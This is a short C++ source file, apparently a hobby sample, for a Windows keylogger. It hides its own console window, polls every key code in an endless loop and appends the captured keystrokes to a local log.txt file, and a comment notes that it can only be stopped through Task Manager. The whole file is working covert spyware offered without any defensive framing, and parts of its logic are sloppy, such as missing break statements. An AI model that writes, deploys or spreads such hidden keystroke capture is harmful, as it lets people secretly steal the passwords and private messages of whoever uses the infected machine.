//simple keylogger program with c++ ...
//in order to actually end the process you have to open task manager and end the exe file's task manually.

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void startLogging();


int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    startLogging();
    return 0;

}

void startLogging(){
    char c;
    while (true){
        for(c=0; c<=254;c++){
            if(GetAsyncKeyState(c) & 0x1){
                ofstream log;
                log.open("log.txt", ios::app);
                
                switch(c){
                    case VK_BACK:
                        log<<"[Backspace]"<<endl;
                        break;
                    case VK_RETURN:
                        log<<"[enter]"<<endl;
                        break;
                    case VK_SHIFT:
                        log<<"[shift]";
                    case VK_CONTROL:
                        log<<"[control]";
                        break;
                    case VK_CAPITAL:
                        log<<"[cap]";
                        break;
                    case VK_TAB:
                        log<<"[tab]";
                        break;
                    case VK_MENU:
                        log<<"[alt]";
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                        break;
                    default:
                        log<<c;
                }
            }
        }
    }
}
